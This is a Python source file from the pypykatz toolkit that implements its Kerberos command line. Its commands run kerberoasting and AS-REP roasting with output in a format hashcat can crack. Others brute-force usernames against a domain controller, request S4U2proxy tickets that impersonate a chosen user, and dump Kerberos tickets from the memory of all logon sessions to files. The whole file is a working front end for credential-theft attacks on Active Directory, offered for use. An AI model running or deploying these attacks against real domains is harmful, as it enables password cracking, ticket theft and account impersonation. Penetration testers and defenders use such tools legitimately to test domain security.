#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import os
import base64
import platform
import argparse
import asyncio
from pypykatz import logger
import traceback

from minikerberos.common.utils import print_table
from minikerberos.protocol.asn1_structs import KRB_CRED
from pypykatz.commons.filetime import filetime_to_dt
from pypykatz.commons.common import geterr
from pypykatz.kerberos.kerberos import get_TGS, get_TGT, generate_targets, \
	brute, asreproast, spnroast, s4u, process_keytab, list_ccache, \
	del_ccache, roast_ccache, ccache_to_kirbi, kirbi_to_ccache

from pypykatz.kerberos.kirbiutils import parse_kirbi, format_kirbi, print_kirbi
from msldap.commons.url import MSLDAPURLDecoder
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential



"""
Kerberos is not part of pypykatz directly. 
This is a wrapper for minikerberos
"""

class KerberosCMDHelper:
	def __init__(self):
		self.live_keywords = ['kerberos']
		self.keywords = ['kerberos']
		
	@staticmethod
	def luid_converter(luid):
		if luid.startswith('0x') is True:
			luid = int(luid, 16)
		return int(luid)
	
	def add_args(self, parser, live_parser):
		live_subcommand_parser = argparse.ArgumentParser(add_help=False)
		live_kerberos_subparsers = live_subcommand_parser.add_subparsers(help = 'live_kerberos_module')
		live_kerberos_subparsers.required = True
		live_kerberos_subparsers.dest = 'live_kerberos_module'
		
		live_luid_parser = live_kerberos_subparsers.add_parser('currentluid', help = 'Prints out the LUID of the current user')

		live_roast_parser = live_kerberos_subparsers.add_parser('roast', help = 'Automatically run spnroast and asreproast')
		live_roast_parser.add_argument('-o','--out-file', help='Output file to store hashcat formatted tickets in')

		live_tgs_parser = live_kerberos_subparsers.add_parser('tgt', help = 'Request a TGT ticket. It may work better specifying the target as cifs/<domain.corp>')
		live_tgs_parser.add_argument('--target', help='SPN string of the service to request the ticket for')
		live_tgs_parser.add_argument('-o','--out-file', help='Output ccache file name')

		live_tgs_parser = live_kerberos_subparsers.add_parser('apreq', help = 'Request a APREQ ticket for a given service')
		live_tgs_parser.add_argument('target', help='SPN string of the service to request the ticket for')
		live_tgs_parser.add_argument('-o','--out-file', help='Output ccache file name')

		live_purge_parser = live_kerberos_subparsers.add_parser('purge', help = 'Purge all tickets. For the current user use --luid 0')
		live_purge_parser.add_argument('--luid', help='LUID of the user whose tickets to be purged. Use "0x" if you specify a hex value!')

		live_sessions_parser = live_kerberos_subparsers.add_parser('sessions', help = 'List user sessions. Needs elevated privileges.')

		live_export_parser = live_kerberos_subparsers.add_parser('dump', help = 'Fetches tickets for a given session or all sessions from memory and prints or exports them as .kirbi files')
		live_export_parser.add_argument('--luid', help='LUID of the user whose tickets to be exported. Use "0x" if you specify a hex value!')
		live_export_parser.add_argument('-o', '--outdir', help='path to kirbi directory')

		live_triage_parser = live_kerberos_subparsers.add_parser('triage', help = 'List tickets for a given session or all sessions')
		live_triage_parser.add_argument('--luid', help='LUID of the user whose tickets to be exported. Use "0x" if you specify a hex value!')
		
		live_parser.add_parser('kerberos', help = 'Kerberos related commands', parents=[live_subcommand_parser])

		#offline part
		#ccache part
		ccache_subcommand_parser = argparse.ArgumentParser(add_help=False)
		kerberos_ccache_subparsers = ccache_subcommand_parser.add_subparsers(help = 'ccache_command')
		kerberos_ccache_subparsers.required = True
		kerberos_ccache_subparsers.dest = 'ccache_module'

		ccache_list = kerberos_ccache_subparsers.add_parser('list', help = 'List ccache file contents')
		ccache_list.add_argument('ccachefile', help='path to CCACHE file')

		ccache_del = kerberos_ccache_subparsers.add_parser('del', help = 'Delete tickets from ccache file based on their order. To get the order user the list command.')
		ccache_del.add_argument('ccachefile', help='path to CCACHE file')
		ccache_del.add_argument('index', type=int, help='ticket index to delete')

		ccache_roast = kerberos_ccache_subparsers.add_parser('roast', help = 'Convert stored tickets to hashcat crackable format')
		ccache_roast.add_argument('ccachefile', help='path to CCACHE file')
		ccache_roast.add_argument('-o','--out-file', help='Output file to store hashcat formatted tickets in')

		ccache_kirbi = kerberos_ccache_subparsers.add_parser('loadkirbi', help = 'Add kirbi file to ccache file.')
		ccache_kirbi.add_argument('ccachefile', help='path to CCACHE file')
		ccache_kirbi.add_argument('kirbifile', help='path to kirbi file / directory')

		ccache_kirbi = kerberos_ccache_subparsers.add_parser('exportkirbi', help = 'Export tickets to kirbi files. One ticket per file.')
		ccache_kirbi.add_argument('ccachefile',help='path to CCACHE file')
		ccache_kirbi.add_argument('kirbidir', help='path to kirbi directory ')
		

		#kirbi
		kirbi_subcommand_parser = argparse.ArgumentParser(add_help=False)
		kerberos_kirbi_subparsers = kirbi_subcommand_parser.add_subparsers(help = 'kirbi_command')
		kerberos_kirbi_subparsers.required = True
		kerberos_kirbi_subparsers.dest = 'kirbi_module'

		kirbi_list = kerberos_kirbi_subparsers.add_parser('parse', help = 'Parse kirbi file and show the ticket')
		kirbi_list.add_argument('kirbifile', help='path to kirbi file')


		kerberos_group = parser.add_parser('kerberos', help='Kerberos related commands')
		kerberos_subparsers = kerberos_group.add_subparsers()
		kerberos_subparsers.required = True
		kerberos_subparsers.dest = 'kerberos_module'

		tgt_parser = kerberos_subparsers.add_parser('tgt', help = 'Fetches a TGT for a given user')
		tgt_parser.add_argument('url', help='user credentials in URL format. Example: "kerberos+password://TEST\\victim:Passw0rd!1@10.10.10.2"')
		tgt_parser.add_argument('-o','--out-file', help='Output file to store the TGT in. CCACHE format.')
		tgt_parser.add_argument('-e','--etype', type=int, default=None, help='Encryption type to be requested')

		tgs_parser = kerberos_subparsers.add_parser('tgs', help = 'Fetches a TGS for a given service/user')
		tgs_parser.add_argument('url', help='user credentials in URL format')
		tgs_parser.add_argument('spn', help='SPN string of the service to request the ticket for')
		tgs_parser.add_argument('-o','--out-file', help='Output file to store the TGT in. CCACHE format.')
		tgs_parser.add_argument('-e','--etype', type=int, default=None, help='Encryption type to be requested')

		brute_parser = kerberos_subparsers.add_parser('brute', help = 'Bruteforcing usernames')
		brute_parser.add_argument('-d','--domain', help='Domain name (realm). This overrides any other domain spec that the users might have.')
		brute_parser.add_argument('-o','--out-file', help='Output file to store the found usernames.')
		brute_parser.add_argument('-n','--show-negatives', action='store_true', help='Print failed enumerations')
		brute_parser.add_argument('address', help='Kerberos server IP/hostname')
		brute_parser.add_argument('targets', nargs='*', help = 'username or file with usernames(one per line). Must be in username@domain format, unless you specified --domain then only the username is needed.You can specify mutliple usernames or files separated by space')

		asreproast_parser = kerberos_subparsers.add_parser('asreproast', help='asreproast')
		asreproast_parser.add_argument('-l','--ldap', help='LDAP URL. Load targets via LDAP connection to the DC.')
		asreproast_parser.add_argument('-d','--domain', help='Domain name (realm). This overrides any other domain spec that the users might have.')
		asreproast_parser.add_argument('-e','--etype', type=int, default=23, help='Encryption type to be requested')
		asreproast_parser.add_argument('-o','--out-file', help='Output file to store the tickets in hashcat crackable format.')
		asreproast_parser.add_argument('address', help='Kerberos server IP/hostname')
		asreproast_parser.add_argument('-t', '--targets', nargs='*', help = 'username or file with usernames(one per line). Must be in username@domain format, unless you specified --domain then only the username is needed.You can specify mutliple usernames or files separated by space')

		spnroast_parser = kerberos_subparsers.add_parser('spnroast', help = 'kerberoast/spnroast')
		spnroast_parser.add_argument('-l','--ldap', help='LDAP URL. Load targets via LDAP connection to the DC.')
		spnroast_parser.add_argument('-d','--domain', help='Domain name (realm). This overrides any other domain spec that the users might have.')
		spnroast_parser.add_argument('-e','--etype', type=int, default=23, help='Encryption type to be requested')
		spnroast_parser.add_argument('-o','--out-file', help='Output file to store the tickets in hashcat crackable format.')
		spnroast_parser.add_argument('url', help='user credentials in Kerberos URL format')
		spnroast_parser.add_argument('-t', '--targets', nargs='*', help = 'username or file with usernames(one per line). Must be in username@domain format, unless you specified --domain then only the username is needed.You can specify mutliple usernames or files separated by space')

		s4u_parser = kerberos_subparsers.add_parser('s4u', help = 'Gets an S4U2proxy ticket impersonating given user')
		s4u_parser.add_argument('url', help='user credentials in URL format')
		s4u_parser.add_argument('spn', help='SPN string of the service to request the ticket for')
		s4u_parser.add_argument('targetuser', help='')
		s4u_parser.add_argument('-o','--out-file', help='Output file to store the TGT in. CCACHE format.')

		keytab_parser = kerberos_subparsers.add_parser('keytab', help = 'Parse keytab file, list secret key(s)')
		keytab_parser.add_argument('keytabfile', help='user credentials in URL format')

		ccache_parser = kerberos_subparsers.add_parser('ccache', help = 'Parse/Edit ccache file', parents=[ccache_subcommand_parser])
		kirbi_parser = kerberos_subparsers.add_parser('kirbi', help = 'Parse/Edit kirbi file', parents=[kirbi_subcommand_parser])
		
	def execute(self, args):
		if len(self.keywords) > 0 and args.command in self.keywords:
			self.run(args)
		
		if len(self.live_keywords) > 0 and args.command == 'live' and args.module in self.live_keywords:
			self.run_live(args)
			
			
	def run_live(self, args):
		if platform.system() != 'Windows':
			print('[-]This command only works on Windows!')
			return
		
		from pypykatz.kerberos.kerberoslive import KerberosLive, live_roast # , purge, list_sessions #get_tgt, get_tgs
		kl = KerberosLive()

		if args.live_kerberos_module == 'roast':
			res, errors, err = asyncio.run(live_roast(args.out_file))
			if err is not None:
				print('[LIVE][KERBEROS][ROAST] Error while roasting tickets! Reason: %s' % geterr(err))
				return
			if args.out_file is None:
				for r in res:
					print(r)

		elif args.live_kerberos_module == 'tgt':
			ticket = kl.get_tgt(args.target)
			if args.out_file is None:
				print_kirbi(ticket)
				return
			
			with open(args.out_file, 'wb') as f:
				f.write(ticket)

		elif args.live_kerberos_module == 'apreq':
			apreq, sessionkey = kl.get_apreq(args.target)
			print('APREQ b64: ')
			print(format_kirbi(apreq.dump()))
			print('Sessionkey b64: %s' % base64.b64encode(sessionkey).decode())		

		
		elif args.live_kerberos_module == 'currentluid':
			print(hex(kl.get_current_luid()))

		elif args.live_kerberos_module == 'purge':
			luid = None
			if args.luid is not None:
				luid = args.luid
				if luid.startswith('0x') is True:
					luid = int(luid, 16)
				luid=int(luid)
			
			kl.purge(luid)
			print('Tickets purged!')

		elif args.live_kerberos_module == 'sessions':
			kl.list_sessions()

		elif args.live_kerberos_module == 'triage':
			if args.luid is None:
				ticketinfos = kl.get_all_ticketinfo()
			else:
				luid = KerberosCMDHelper.luid_converter(args.luid)
				ticketinfos = kl.get_ticketinfo(luid)

			table = [['LUID', 'ServerName', 'RealmName', 'StartTime', 'EndTime', 'RenewTime', 'EncryptionType', 'TicketFlags']]
			for luid in ticketinfos:
				if len(ticketinfos[luid]) == 0:
					continue
				
				for ticket in ticketinfos[luid]:
					table.append([
						hex(luid), 
						ticket['ServerName'], 
						ticket['RealmName'], 
						filetime_to_dt(ticket['StartTime']).isoformat(), 
						filetime_to_dt(ticket['EndTime']).isoformat(), 
						filetime_to_dt(ticket['RenewTime']).isoformat(), 
						str(ticket['EncryptionType']), 
						str(ticket['TicketFlags'])
					])
				
			print_table(table)
			
		
		elif args.live_kerberos_module == 'dump':
			if args.luid is None:
				tickets = kl.export_all_ticketdata()
			else:
				luid = KerberosCMDHelper.luid_converter(args.luid)
				tickets = kl.export_ticketdata(luid)

			if args.outdir is not None:
				for luid in tickets:
					for ticket in tickets[luid]:
						try:
							pt = KRB_CRED.load(ticket['Ticket']).native
							name = '_'.join(pt['tickets'][0]['sname']['name-string'])
							name = hex(int(luid)) + '_' + '@'.join([name, pt['tickets'][0]['realm']])
						except:
							name = hex(int(luid)) + '_' + os.urandom(4).hex()
						with open(os.path.join(args.outdir, 'ticket_%s.kirbi' % name), 'wb') as f:
							f.write(ticket['Ticket'])

			else:
				for luid in tickets:
					if len(tickets[luid]) == 0:
						continue

					print('LUID @%s' % hex(luid))
					for ticket in tickets[luid]:
						print_kirbi(ticket['Ticket'])
		

	def run(self, args):

		if args.kerberos_module == 'tgt':
			kirbi, err = asyncio.run(get_TGT(args.url, override_etype = args.etype))
			if err is not None:
				print('[KERBEROS][TGT] Failed to fetch TGT! Reason: %s' % err)
				return
			
			if args.out_file is not None:
				with open(args.out_file, 'wb') as f:
					f.write(kirbi.dump())
			else:
				print_kirbi(kirbi)

		elif args.kerberos_module == 'tgs':
			tgs, encTGSRepPart, key, kirbi, err = asyncio.run(get_TGS(args.url, args.spn, override_etype = args.etype))
			if err is not None:
				print('[KERBEROS][TGS] Failed to fetch TGS! Reason: %s' % err)
				return

			if args.out_file is not None:
				with open(args.out_file, 'wb') as f:
					f.write(kirbi.dump())
			else:
				print_kirbi(kirbi)
		
		elif args.kerberos_module == 'brute':
			target_spns = generate_targets(args.targets, args.domain)
			_, err = asyncio.run(brute(args.address, target_spns, args.out_file, args.show_negatives))
			if err is not None:
				print('[KERBEROS][BRUTE] Error while enumerating users! Reason: %s' % geterr(err))
				return

		elif args.kerberos_module == 'asreproast':
			if args.ldap is None:
				target_spns = generate_targets(args.targets, args.domain, to_spn = False)
			else:
				target_spns, _ = asyncio.run(get_ldap_kerberos_targets(args.ldap, target_type = 'asrep'))
			_, err = asyncio.run(asreproast(args.address, target_spns, out_file = args.out_file, etype = args.etype))
			if err is not None:
				print('[KERBEROS][ASREPROAST] Error! Reason: %s' % geterr(err))
				return

		elif args.kerberos_module == 'spnroast':
			if args.ldap is None and args.targets is None:
				raise Exception('Either LDAP URL or targets must be provided')
			if args.ldap is None:
				target_spns = generate_targets(args.targets, args.domain, to_spn = True)
			else:
				_, target_spns = asyncio.run(get_ldap_kerberos_targets(args.ldap, target_type = 'spn'))
			_, err = asyncio.run(spnroast(args.url, target_spns, out_file = args.out_file, etype = args.etype))
			if err is not None:
				print('[KERBEROS][SPNROAST] Error! Reason: %s' % geterr(err))
				return

		elif args.kerberos_module == 's4u':
			tgs, encTGSRepPart, key, kirbi, err =  asyncio.run(s4u(args.url, args.spn, args.targetuser))
			if err is not None:
				print('[KERBEROS][S4U] Error! Reason: %s' % geterr(err))
				return
			
			if args.out_file is not None:
				with open(args.out_file, 'wb') as f:
					f.write(kirbi.dump())
			else:
				print_kirbi(kirbi)

		elif args.kerberos_module == 'keytab':
			process_keytab(args.keytabfile)

		elif args.kerberos_module == 'ccache':
			if args.ccache_module == 'list':
				list_ccache(args.ccachefile)
			elif args.ccache_module == 'roast':
				roast_ccache(args.ccachefile, args.out_file)
			elif args.ccache_module == 'del':
				del_ccache(args.ccachefile, args.index)
			elif args.ccache_module == 'exportkirbi':
				ccache_to_kirbi(args.ccachefile, args.kirbidir)
			elif args.ccache_module == 'loadkirbi':
				kirbi_to_ccache(args.ccachefile, args.kirbi)
		
		elif args.kerberos_module == 'kirbi':
			if args.kirbi_module == 'parse':
				parse_kirbi(args.kirbifile)


def get_ldap_url(authmethod = 'ntlm', host = None):
	from winacl.functions.highlevel import get_logon_info
	info = get_logon_info()

	logonserver = info['logonserver']
	if host is not None:
		logonserver = host

	return 'ldap+sspi-%s://%s\\%s@%s' % (authmethod, info['domain'], info['username'], logonserver)

async def get_ldap_kerberos_targets(ldap_url, target_type = 'all', authmethod = 'ntlm', host = None):
	if ldap_url == 'auto':
		ldap_url = get_ldap_url(authmethod = authmethod, host = host)
	
	msldap_url = MSLDAPURLDecoder(ldap_url)
	client = msldap_url.get_client()
	_, err = await client.connect()
	if err is not None:
		raise err

	domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')
	spn_users = []
	asrep_users = []

	if target_type == 'asrep' or target_type == 'all':
		async for user, err in client.get_all_knoreq_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
				
			asrep_users.append(cred)
	
	if target_type == 'spn' or target_type == 'all':
		async for user, err in client.get_all_service_users():
			if err is not None:
				raise err
			cred = KerberosSPN()
			cred.username = user.sAMAccountName
			cred.domain = domain
				
			spn_users.append(cred)
	
	return asrep_users, spn_users